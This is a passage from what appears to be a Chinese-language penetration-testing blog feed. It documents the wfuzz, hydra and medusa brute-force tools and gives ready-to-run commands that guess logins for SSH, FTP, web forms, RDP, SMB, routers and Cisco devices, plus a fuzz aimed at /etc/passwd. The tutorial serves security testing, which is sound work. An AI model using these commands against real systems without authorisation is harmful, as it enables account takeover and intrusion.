是一款Python开发的Web安全测试工具<br>wfuzz不仅仅是一个web扫描器：</p><ul><li>wfuzz能够通过发现并利用网站弱点&#x2F;漏洞的方式帮助你使网站更加安全。wfuzz的漏洞扫描功能由插件支持。</li><li>wfuzz是一个完全模块化的框架，这使得即使是Python初学者也能够进行开发和贡献代码。开发一个wfuzz插件是一件非常简单的事，通常只需几分钟。</li><li>wfuzz提供了简洁的编程语言接口来处理wfuzz或Burpsuite获取到的HTTP请求和响应。这使得你能够在一个良好的上下文环境中进行手工测试或半自动化的测试，而不需要依赖web形式的扫描器。</li></ul><h5 id="使用语法和参数-1"><a href="#使用语法和参数-1" class="headerlink" title="使用语法和参数"></a>使用语法和参数</h5><pre class="language-javascript" data-language="javascript"><code class="language-javascript">选项：<span class="token operator">-</span>h<span class="token operator">/</span><span class="token operator">--</span>help：帮助<span class="token operator">--</span>help：高级帮助<span class="token operator">--</span>filter<span class="token operator">-</span>help：筛选器帮助<span class="token operator">--</span>version：Wfuzz版本详细信息<span class="token operator">-</span>e＜type＞：可用编码器<span class="token operator">/</span>有效负载<span class="token operator">/</span>迭代器<span class="token operator">/</span>打印机<span class="token operator">/</span>脚本列表<span class="token operator">--</span>recipe＜filename＞：从配方中读取选项。对各种食谱重复上述步骤。<span class="token operator">--</span>dump recipe＜filename＞：将当前选项打印为配方<span class="token operator">--</span>oF＜filename＞：将模糊结果保存到文件中。这些可以稍后使用wfuzz有效负载来使用。<span class="token operator">-</span>c：带颜色的输出<span class="token operator">-</span>v：详细信息。<span class="token operator">-</span>f filename，printer：使用指定的打印机（如果省略了原始打印机）将结果存储在输出文件中。<span class="token operator">-</span>o printer：使用指定的打印机显示结果。<span class="token operator">--</span>interact<span class="token operator">:</span>（beta）如果选中，则捕获所有按键。这允许您与程序交互。<span class="token operator">--</span>dry<span class="token operator">-</span>run：打印应用请求的结果，而不实际发出任何<span class="token constant">HTTP</span>请求。<span class="token operator">--</span>prev：打印以前的<span class="token constant">HTTP</span>请求（仅当使用生成模糊结果的有效负载时）<span class="token operator">--</span>efield＜expr＞：显示指定的语言表达式以及当前负载。对各个字段重复上述操作。<span class="token operator">--</span>field＜expr＞：不显示有效负载，只显示指定的语言表达式。对各个字段重复上述操作。<span class="token operator">-</span>p addr：使用ip<span class="token operator">:</span>port<span class="token operator">:</span>type格式的代理。重复使用各种代理的选项。如果省略，类型可以是<span class="token constant">SOCKS4</span>、<span class="token constant">SOCKS5</span>或<span class="token constant">HTTP</span>。<span class="token operator">-</span>t <span class="token constant">N</span>：指定并发连接数（默认值为<span class="token number">10</span>）<span class="token operator">-</span>s <span class="token constant">N</span>：指定请求之间的时间延迟（默认值为<span class="token number">0</span>）<span class="token operator">-</span><span class="token constant">R</span> depth：递归路径发现深度是最大递归级别。<span class="token operator">-</span><span class="token constant">D</span> depth：最大链接深度级别。<span class="token operator">-</span><span class="token constant">L</span><span class="token punctuation">,</span> <span class="token operator">--</span>follow<span class="token operator">:</span>遵循<span class="token constant">HTTP</span>重定向<span class="token operator">--</span>ip<span class="token operator">-</span>host<span class="token operator">:</span>port：以ip<span class="token operator">:</span>port格式指定要连接的ip，而不是<span class="token constant">URL</span>的主机<span class="token operator">-</span><span class="token constant">Z</span>：扫描模式（将忽略连接错误）。<span class="token operator">--</span>req delay <span class="token constant">N</span>：设置请求允许的最长时间（以秒为单位）（<span class="token constant">CURLOPT_TIMEOUT</span>）。默认值<span class="token number">90</span>。<span class="token operator">--</span>conn<span class="token operator">-</span>delay <span class="token constant">N</span>：设置服务器连接阶段要花费的最长时间（以秒为单位）（<span class="token constant">CURLOPT_CONNECTTIMEOUT</span>）。默认值<span class="token number">90</span>。<span class="token operator">-</span><span class="token constant">A</span><span class="token punctuation">,</span> <span class="token operator">--</span><span class="token constant">AA</span><span class="token punctuation">,</span> <span class="token operator">--</span><span class="token constant">AAA</span><span class="token operator">:</span> <span class="token operator">--</span>script<span class="token operator">=</span><span class="token keyword">default</span>，verbose，discovery<span class="token operator">-</span>v<span class="token operator">-</span>c的别名<span class="token operator">--</span>no<span class="token operator">-</span>cache：禁用插件缓存。将扫描每个请求。<span class="token operator">--</span>script<span class="token operator">=</span>：相当于<span class="token operator">--</span>script<span class="token operator">=</span>默认值<span class="token operator">--</span>script<span class="token operator">=</span><span class="token operator">&lt;</span>plugins<span class="token operator">></span>：运行脚本的扫描<span class="token operator">&lt;</span>plugins<span class="token operator">></span>是以逗号分隔的插件文件或插件类别列表<span class="token operator">--</span>script help<span class="token operator">=</span><span class="token operator">&lt;</span>plugins<span class="token operator">></span>：显示有关脚本的帮助。<span class="token operator">--</span>script<span class="token operator">-</span>args n1<span class="token operator">=</span>v1，…：为脚本提供参数。即<span class="token operator">--</span>script args grep<span class="token punctuation">.</span>regex<span class="token operator">=</span>“<span class="token operator">&lt;</span><span class="token constant">A</span> href<span class="token operator">=</span>\”（<span class="token punctuation">.</span><span class="token operator">*</span>？）\“<span class="token operator">></span>”<span class="token operator">-</span>u url：指定请求的url。<span class="token operator">-</span>m iterator：指定用于组合有效载荷的迭代器（默认为product）<span class="token operator">-</span>z payload：以名称<span class="token punctuation">[</span>，参数<span class="token punctuation">]</span><span class="token punctuation">[</span>，编码器<span class="token punctuation">]</span>的形式为每个<span class="token constant">FUZZ</span>关键字指定有效负载。可以使用编码器列表，即md5<span class="token operator">-</span>sha1。编码器可以是链式的，即。md5@sha1<span class="token punctuation">.</span>可以使用编码器类别。即url使用帮助作为有效负载来显示有效负载插件的详细信息（您可以使用<span class="token operator">--</span>slice进行过滤）<span class="token operator">--</span>zP＜params＞：指定有效负载的参数（必须以<span class="token operator">-</span>z或<span class="token operator">-</span>w开头）。<span class="token operator">--</span>zD<span class="token operator">&lt;</span><span class="token keyword">default</span><span class="token operator">></span>：指定有效负载的默认参数（必须以<span class="token operator">-</span>z或<span class="token operator">-</span>w开头）。<span class="token operator">--</span>zE＜encoder＞：指定有效负载的编码器（它必须以<span class="token operator">-</span>z或<span class="token operator">-</span>w开头）。<span class="token operator">--</span>slice＜filter＞：使用指定的表达式过滤有效负载的元素。它必须以<span class="token operator">-</span>z开头。<span class="token operator">-</span>w wordlist：指定wordlist文件（<span class="token operator">-</span>z文件的别名，wordlist）。<span class="token operator">-</span><span class="token constant">V</span> alltype：所有参数brutforming（allvars和allpost）。不需要<span class="token constant">FUZZ</span>关键字。<span class="token operator">-</span><span class="token constant">X</span> method：指定请求的<span class="token constant">HTTP</span>方法，即<span class="token constant">HEAD</span>或<span class="token constant">FUZZ</span><span class="token operator">-</span>b cookie：为请求指定cookie。对各种cookie重复选项。<span class="token operator">-</span>d postdata：使用postdata（例如：“id<span class="token operator">=</span><span class="token constant">FUZZ</span><span class="token operator">&amp;</span>catalog<span class="token operator">=</span><span class="token number">1</span>”）<span class="token operator">-</span><span class="token constant">H</span> <span class="token literal-property property">header：使用header（例如：“Cookie</span><span class="token operator">:</span>id<span class="token operator">=</span><span class="token number">1312321</span><span class="token operator">&amp;</span>user<span class="token operator">=</span><span class="token constant">FUZZ</span>”）。对各种标题重复选项。<span class="token operator">--</span>basic<span class="token operator">/</span>ntlm<span class="token operator">/</span>digest auth：格式为“user<span class="token operator">:</span>pass”或“<span class="token constant">FUZZ</span><span class="token operator">:</span><span class="token constant">FUZZ</span>”或<span class="token operator">--</span>hc<span class="token operator">/</span>hl<span class="token operator">/</span>hw<span class="token operator">/</span>hh <span class="token constant">N</span><span class="token punctuation">[</span>，<span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">+</span>：隐藏具有指定代码<span class="token operator">/</span>行<span class="token operator">/</span>字<span class="token operator">/</span>字符的响应（使用<span class="token constant">BBB</span>从基线获取值）<span class="token operator">--</span>sc<span class="token operator">/</span>sl<span class="token operator">/</span>sw<span class="token operator">/</span>sh <span class="token constant">N</span><span class="token punctuation">[</span>，<span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">+</span>：显示具有指定代码<span class="token operator">/</span>行<span class="token operator">/</span>字<span class="token operator">/</span>字符的响应（使用<span class="token constant">BBB</span>获取基线值）<span class="token operator">--</span>ss<span class="token operator">/</span>hs正则表达式：显示<span class="token operator">/</span>隐藏内容中具有指定正则表达式的响应<span class="token operator">--</span>filter＜filter＞：使用指定的筛选器表达式显示<span class="token operator">/</span>隐藏响应（使用<span class="token constant">BBB</span>从基线获取值）<span class="token operator">--</span>prefilter＜filter＞：使用指定的表达式在模糊化之前过滤项目。对串联过滤器重复上述步骤。</code></pre><h5 id="wfuzz常见用法"><a href="#wfuzz常见用法" class="headerlink" title="wfuzz常见用法"></a>wfuzz常见用法</h5><hr><h6 id="模糊查询GET请求参数"><a href="#模糊查询GET请求参数" class="headerlink" title="模糊查询GET请求参数"></a>模糊查询GET请求参数</h6><pre class="language-none"><code class="language-none">wfuzz -u &quot;http:&#x2F;&#x2F;192.168.1.104&#x2F;test.php?FUZZ&#x3D;&#x2F;etc&#x2F;passwd&quot; -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt --hh 80</code></pre><p><img src="wfuzz.png" loading="lazy"></p><h6 id="模糊查询POST请求参数"><a href="#模糊查询POST请求参数" class="headerlink" title="模糊查询POST请求参数"></a>模糊查询POST请求参数</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -d &quot;uname&#x3D;FUZZ&amp;pass&#x3D;FUZZ&quot;  --hc 302 http:&#x2F;&#x2F;192.168.1.102&#x2F;user.php</code></pre><h6 id="添加cookie发起请求"><a href="#添加cookie发起请求" class="headerlink" title="添加cookie发起请求"></a>添加cookie发起请求</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -b cookie&#x3D;value1 -b cookie2&#x3D;value2 http:&#x2F;&#x2F;192.168.1.102&#x2F;FUZZ</code></pre><h6 id="添加请求头"><a href="#添加请求头" class="headerlink" title="添加请求头"></a>添加请求头</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -H &quot;Referer: 127.0.0.1&quot; http:&#x2F;&#x2F;192.168.1.102&#x2F;FUZZ</code></pre><h6 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;subdomains-top1mil-5000.txt -u cc123.com -H &quot;Host:FUZZ.cc123.com&quot; --hw 53</code></pre><p><img src="wfuzz_2.png" loading="lazy"></p><h6 id="爆破401认证界面"><a href="#爆破401认证界面" class="headerlink" title="爆破401认证界面"></a>爆破401认证界面</h6><pre class="language-none"><code class="language-none">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --basic mum:FUZZ -u http:&#x2F;&#x2F;192.168.1.106:631&#x2F;admin&#x2F; -b &quot;org.cups.sid&#x3D;f607a41978fbca423d4de60f686fe8f5&quot; -d &quot;org.cups.sid&#x3D;f607a41978fbca423d4de60f686fe8f5&amp;OP&#x3D;add-printer&quot; -Z --hc 401</code></pre><p><img src="wfuzz_3.png" loading="lazy"></p><h4 id="hydra-九头蛇"><a href="#hydra-九头蛇" class="headerlink" title="hydra(九头蛇)"></a>hydra(九头蛇)</h4><h5 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h5><p>Hydra是一个暴力在线密码破解程序，一个针对系统登录密码的快速爆破工具。</p><p>我们可以使用Hydra运行一个字典并”暴力破解”一些身份验证服务，想象一下试图在特定服务上手动猜测某人的密码（SSH, Web应用程序登录框, FTP，SNMP），使用 Hydra 运行密码字典以确定正确的密码。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Hydra能够尝试暴力破解以下协议：</span>Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle监听器, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP枚举, SNMP v1+v2+v3, SOCKS5, SSH <span class="token punctuation">(</span>v1和v2<span class="token punctuation">)</span>, SSHKEY, Subversion, Teamspeak <span class="token punctuation">(</span>TS2<span class="token punctuation">)</span>, Telnet, VMware-Auth, VNC以及XMPP等。</code></pre><h5 id="使用语法和参数-2"><a href="#使用语法和参数-2" class="headerlink" title="使用语法和参数"></a>使用语法和参数</h5><p>语法：hydra [-Options] [IP] [service]</p><p>Example:  hydra -l user -P passlist.txt <a href="ftp://192.168.0.1/">ftp://192.168.0.1</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-l</span> login 小写，指定用户名进行破解<span class="token parameter variable">-L</span> <span class="token function">file</span> 大写，指定用户的用户名字典<span class="token parameter variable">-p</span> pass 小写，用于指定密码破解，很少使用，一般采用密码字典。<span class="token parameter variable">-P</span> <span class="token function">file</span> 大写，用于指定密码字典。<span class="token parameter variable">-e</span> ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探<span class="token parameter variable">-M</span> <span class="token function">file</span> 指定目标ip列表文件，批量破解。<span class="token parameter variable">-o</span> <span class="token function">file</span> 指定结果输出文件<span class="token parameter variable">-f</span> 找到第一对登录名或者密码的时候中止破解。<span class="token parameter variable">-t</span> tasks 同时运行的线程数，默认是16<span class="token parameter variable">-w</span> <span class="token function">time</span> 设置最大超时时间，单位<span class="token parameter variable">-v</span> / <span class="token parameter variable">-V</span> 显示详细过程<span class="token parameter variable">-R</span> 恢复爆破（如果破解中断了，下次执行 hydra <span class="token parameter variable">-R</span> /path/to/hydra.restore 就可以继续任务。）<span class="token parameter variable">-x</span> 自定义密码。</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">service：指定服务名，支持的服务跟协议有：telnet，ftp，pop3等等。注意点：<span class="token number">1</span>.自己创建字典,然后放在当前的目录下或者指定目录。<span class="token number">2</span>.参数可以统一放在最后，格式比如hydra <span class="token function">ip</span> 服务 参数。<span class="token number">3</span>.如果能确定用户名一项时候，比如web登录破解，直接用 -l就可以，然后剩余时间破解密码。<span class="token number">4</span>.缺点，如果目标网站登录时候需要验证码就无法破解。<span class="token number">5</span>.man hydra最万能。<span class="token number">6</span>.或者hydra <span class="token parameter variable">-U</span> http-form等查看具体帮助。</code></pre><h5 id="Kail字典"><a href="#Kail字典" class="headerlink" title="Kail字典"></a>Kail字典</h5><p>在kail中是自带字典的，可以通过&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb路径进行查看，当然都是txt文件，也可以自己向里面添加。</p><table><thead><tr><th>文件名</th><th>介绍</th></tr></thead><tbody><tr><td>big.txt</td><td>大的字典</td></tr><tr><td>small.txt</td><td>小的字典</td></tr><tr><td>catala.txt</td><td>项目配置字典</td></tr><tr><td>common.txt</td><td>公共字典</td></tr><tr><td>euskera.txt</td><td>数据目录字典</td></tr><tr><td>extensions_common.txt</td><td>常用文件扩展名字典</td></tr><tr><td>indexes.txt</td><td>首页字典</td></tr><tr><td>mutations_common.txt</td><td>备份扩展名</td></tr><tr><td>spanish.txt</td><td>方法名或库目录</td></tr><tr><td>others</td><td>扩展目录，默认用户名、默认密码等</td></tr><tr><td>stress</td><td>压力测试</td></tr><tr><td>vulns</td><td>漏洞测试</td></tr></tbody></table><h5 id="Hydra密码生成器"><a href="#Hydra密码生成器" class="headerlink" title="Hydra密码生成器"></a>Hydra密码生成器</h5><table><thead><tr><th>参数</th><th>介绍</th></tr></thead><tbody><tr><td>-x MIN:MAX:CHARSET 密码暴力破解生成器</td><td>规则：MIN表示生成密码的最短长度；MAX表示生成密码的最长长度；CHARSET表示使用指定的字符生成密码，’a’表示所有的小写字母，’A’表示所有的大写字母,’1’表示所有的数字，对于其他字符，只需要添加在后面即可</td></tr><tr><td>-y</td><td>使用方式见-x，它表示charset的字符是实际的字符，而不是正则表达式</td></tr><tr><td>-x 3:5:a</td><td>生成的密码字典长度为3到5位，由所有的小写字母组成</td></tr><tr><td>-x 5:8:A1</td><td>生成的密码字典长度为5到8位，有所有的大写字母和数字组成</td></tr><tr><td>-x 5:5&#x2F;%,.-</td><td>生成的密码字典长度为5位，只由’&#x2F; % , . -‘这5种字符构成</td></tr><tr><td>-x 3:5:aA1 -y</td><td>生成的密码字典长度为3到5位，且只由’a A 1’这三种字符组成</td></tr><tr><td>-x 3:5:aA1.-+#</td><td>生成的密码字典长度为3到8位，由大小写字母+数字+.-+#进行组合。</td></tr></tbody></table><h5 id="Hydra案例"><a href="#Hydra案例" class="headerlink" title="Hydra案例"></a>Hydra案例</h5><h6 id="暴破ssh登录密码"><a href="#暴破ssh登录密码" class="headerlink" title="暴破ssh登录密码"></a>暴破ssh登录密码</h6><p>为了测试方便，我们创建两个简单的字典文件</p><p>根据命令参数，组织参数格式如下：</p><pre class="language-ruby" data-language="ruby"><code class="language-ruby">root<span class="token variable">@kali</span><span class="token operator">:</span><span class="token operator">/</span>mnt<span class="token comment"># hydra -L user.txt -P password.txt -t 2 -vV -e ns 192.168.154.131 ssh</span></code></pre><h6 id="FTP协议破解"><a href="#FTP协议破解" class="headerlink" title="FTP协议破解"></a>FTP协议破解</h6><pre class="language-css" data-language="css"><code class="language-css">破解ftp：hydra -L 用户名字典 -P 密码字典 -t 6 -e ns IP地址 -v</code></pre><h6 id="http协议破解"><a href="#http协议破解" class="headerlink" title="http协议破解"></a>http协议破解</h6><pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">get</span>方式提交，破解web登录：hydra <span class="token operator">-</span>L 用户名字典 <span class="token operator">-</span>P 密码字典 <span class="token operator">-</span>t 线程 <span class="token operator">-</span>v <span class="token operator">-</span>e ns IP地址 http<span class="token operator">-</span><span class="token keyword">get</span> <span class="token operator">/</span>admin<span class="token operator">/</span>hydra <span class="token operator">-</span>L 用户名字典 <span class="token operator">-</span>P 密码字典 <span class="token operator">-</span>t 线程 <span class="token operator">-</span>v <span class="token operator">-</span>e ns <span class="token operator">-</span>f IP地址 http<span class="token operator">-</span><span class="token keyword">get</span> <span class="token operator">/</span>admin<span class="token operator">/</span>index<span class="token punctuation">.</span>phppost方式提交，破解web登录：hydra <span class="token operator">-</span>f <span class="token operator">-</span>l 用户名 <span class="token operator">-</span>P 密码字典 <span class="token operator">-</span>V <span class="token operator">-</span>s <span class="token number">9900</span> IP地址 http<span class="token operator">-</span>post<span class="token operator">-</span>form <span class="token string">"/admin/index.php?action=login:user=USER&amp;pw=PASS:"</span><span class="token preprocessor property">#/index.php …这个是登录的 url</span><span class="token preprocessor property">#后门是POST的数据 其中的用户名密码使用 USER PASS 来代替</span><span class="token preprocessor property">#然后是如果登录出错 会出现的字符 。。。然后开始破解</span></code></pre><h6 id="https协议破解"><a href="#https协议破解" class="headerlink" title="https协议破解"></a>https协议破解</h6><pre class="language-bash" data-language="bash"><code class="language-bash">破解httpshydra <span class="token parameter variable">-m</span> /index.php <span class="token parameter variable">-l</span> 用户名 <span class="token parameter variable">-P</span> 密码字典.txt IP地址 https</code></pre><h6 id="路由器破解"><a href="#路由器破解" class="headerlink" title="路由器破解"></a>路由器破解</h6><pre class="language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-x</span> <span class="token number">6</span>:10:1a.~<span class="token operator">!</span>@<span class="token comment">#$%^&amp;()-= -t 8 192.168.1.1 http-get /</span><span class="token parameter variable">-l</span> admin 为尝试破解的用户名。<span class="token comment"># -x 6:10:1a. 表示枚举的密码由 数字、小写字母和单字符’.'等等组成，长度为 6 - 10 位。-t 8 表示分 8 个并行任务进行爆破尝试。192.168.1.1 为 Router 地址。http-get 为破解方式（协议）</span></code></pre><h6 id="http-proxy协议破解"><a href="#http-proxy协议破解" class="headerlink" title="http-proxy协议破解"></a>http-proxy协议破解</h6><pre class="language-cpp" data-language="cpp"><code class="language-cpp">破解http<span class="token operator">-</span>proxy：hydra <span class="token operator">-</span>l admin <span class="token operator">-</span>P 字典<span class="token punctuation">.</span>txt http<span class="token operator">-</span>proxy<span class="token operator">:</span><span class="token comment">//IP地址</span></code></pre><h6 id="smb破解"><a href="#smb破解" class="headerlink" title="smb破解"></a>smb破解</h6><pre class="language-css" data-language="css"><code class="language-css">破解smb：hydra -l 用户名字典 -P 密码字典 IP地址 smb</code></pre><h6 id="Windows远程桌面"><a href="#Windows远程桌面" class="headerlink" title="Windows远程桌面"></a>Windows远程桌面</h6><pre class="language-scss" data-language="scss"><code class="language-scss">破解<span class="token function">rdp</span><span class="token punctuation">(</span>windows远程登录<span class="token punctuation">)</span>：hydra ip地址 rdp -l administrator -P 密码字典.txt -V</code></pre><h6 id="邮箱pop3"><a href="#邮箱pop3" class="headerlink" title="邮箱pop3"></a>邮箱pop3</h6><pre class="language-css" data-language="css"><code class="language-css">破解邮箱pop3：hydra -l 用户名 -P 密码字典.txt my.pop3.mail pop3</code></pre><h6 id="telnet破解"><a href="#telnet破解" class="headerlink" title="telnet破解"></a>telnet破解</h6><pre class="language-css" data-language="css"><code class="language-css">hydra ip地址 telnet -l 用户字典.txt -P 密码字典.txt -t 32 -s 23 -e ns -f -V</code></pre><h6 id="语音通讯工具teamspeak"><a href="#语音通讯工具teamspeak" class="headerlink" title="语音通讯工具teamspeak"></a>语音通讯工具teamspeak</h6><pre class="language-css" data-language="css"><code class="language-css">hydra -l 用户名字典 -P 密码字典.txt -s 端口号 -vV ip teamspeak</code></pre><h6 id="cisco"><a href="#cisco" class="headerlink" title="cisco"></a>cisco</h6><pre class="language-css" data-language="css"><code class="language-css">hydra -P 密码字典 IP地址 ciscohydra -m cloud -P 密码字典 IP地址 cisco-enable</code></pre><h4 id="medusa-美杜莎"><a href="#medusa-美杜莎" class="headerlink" title="medusa(美杜莎)"></a>medusa(美杜莎)</h4><h5 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h5><p>Medusa(美杜莎)是一个速度快，支持大规模并行，模块化，爆破登录。可以同时对多个主机，用户或密码执行强力测试。Medusa 和 hydra 一样，同样属于在线密码破解工具。不同的是，medusa 的稳定性相较于 hydra 要好很多，但其支持模块要比 hydra 少一些。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># medusa支持一下协议</span>AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP <span class="token punctuation">(</span>NetWare<span class="token punctuation">)</span>,NNTP, PcAnywhere, POP3, PostgreSQL, rexec, RDP、rlogin, rsh, SMBNT, SMTP<span class="token punctuation">(</span>AUTH/VRFY<span class="token punctuation">)</span>, SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC、Generic Wrapper以及Web表单</code></pre><h5 id="使用语法和参数-3"><a href="#使用语法和参数-3" class="headerlink" title="使用语法和参数"></a>使用语法和参数</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用语法</span>medusa <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token parameter variable">-h</span> <span class="token operator">&lt;</span>目标主机<span class="token operator">></span> <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>用户名<span class="token operator">></span> <span class="token parameter variable">-P</span> <span class="token operator">&lt;</span>密码字典文件<span class="token operator">></span><span class="token comment"># -h 参数指定要破解的目标主机IP或域名，-u 参数指定要破解的用户名，-P 参数指定密码字典文件路径</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-h</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#目标IP</span><span class="token parameter variable">-H</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#目标主机文件</span><span class="token parameter variable">-u</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#用户名</span><span class="token parameter variable">-U</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#用户名文件</span><span class="token parameter variable">-p</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#密码;</span><span class="token parameter variable">-P</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#密码文件</span><span class="token parameter variable">-C</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#组合条目文件</span><span class="token parameter variable">-O</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#文件日志信息</span><span class="token parameter variable">-e</span> <span class="token punctuation">[</span>n/s/ns<span class="token punctuation">]</span>    <span class="token comment">#N意为空密码，S意为密码与用户名相同;指定要排除的密码，可以使用正则表达式。</span><span class="token parameter variable">-M</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#模块执行名称</span><span class="token parameter variable">-m</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#传递参数到模块</span><span class="token parameter variable">-d</span>    <span class="token comment">#显示所有的模块名称</span><span class="token parameter variable">-n</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#使用非默认端口</span><span class="token parameter variable">-s</span>    <span class="token comment">#启用SSL</span><span class="token parameter variable">-r</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#重试间隔时间，默认为3秒</span><span class="token parameter variable">-t</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#设定线程数量</span><span class="token parameter variable">-L</span>    <span class="token comment">#并行化，每个用户使用一个线程</span><span class="token parameter variable">-f</span>    <span class="token comment">#在任何主机上找到第一个账号/密码后，停止破解</span><span class="token parameter variable">-q</span>    <span class="token comment">#显示模块的使用信息</span><span class="token parameter variable">-v</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#详细级别（0-6）</span><span class="token parameter variable">-w</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#错误调试级别（0-10）</span><span class="token parameter variable">-V</span>    <span class="token comment">#显示版本</span><span class="token parameter variable">-Z</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#继续扫描上一次</span></code></pre><h5 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h5><h6 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h6><pre class="language-python" data-language="python"><code class="language-python">medusa <span class="token operator">-</span>M ssh <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.131</span> <span class="token operator">-</span>u root <span class="token operator">-</span>P <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>john<span class="token operator">/</span>password<span class="token punctuation">.</span>lst <span class="token operator">-</span>f<span class="token triple-quoted-string string">'''-h：要爆破的目标主机IP地址 192.168.56.131-l：要爆破的用户名 root-P：要爆破的密码字典 用的字典是自己弄的-M：调用模块ssh执行-f：一旦爆破成功一个就立即停止爆破'''</span></code></pre><h6 id="爆破Windows远程远程桌面协议-smbnt-3389"><a href="#爆破Windows远程远程桌面协议-smbnt-3389" class="headerlink" title="爆破Windows远程远程桌面协议(smbnt)3389"></a>爆破Windows远程远程桌面协议(smbnt)3389</h6><pre class="language-python" data-language="python"><code class="language-python">medusa <span class="token operator">-</span>M smbnt <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.132</span> <span class="token operator">-</span>u Administrator <span class="token operator">-</span>P <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>john<span class="token operator">/</span>password<span class="token punctuation">.</span>lst <span class="token operator">-</span>f<span class="token triple-quoted-string string">'''-h：要爆破的目标主机IP地址 192.168.56.132-l：要爆破的用户名 Administrator-P：要爆破的密码字典 /usr/share/john/password.lst-M：调用smbnt模块执行-f：一旦爆破成功一个就立即停止爆破'''</span></code></pre><p>Ps: 验证码爆破可以使用ddddocr和captcha-killer-modified</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019-web</title>
      <link href="/2024/08/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/"/>
      <url>/2024/08/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/</url>
      
